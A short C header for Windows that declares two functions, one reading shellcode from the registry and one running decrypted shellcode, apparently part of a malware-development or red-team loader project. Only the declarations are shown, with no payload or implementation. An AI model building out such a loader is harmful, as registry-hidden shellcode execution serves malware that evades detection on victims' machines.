#pragma once
#ifndef WRITE_PAYLOAD_H
#define WRITE_PAYLOAD_H

#include <windows.h>

// Function to read shellcode from the registry
BOOL ReadShellcodeFromRegistry(IN DWORD sPayloadSize, OUT PBYTE* ppPayload);

// Function to execute the shellcode
BOOL RunShellcode(IN PVOID pDecryptedShellcode, IN SIZE_T sDecryptedShellcodeSize);

#endif  // WRITE_PAYLOAD_H
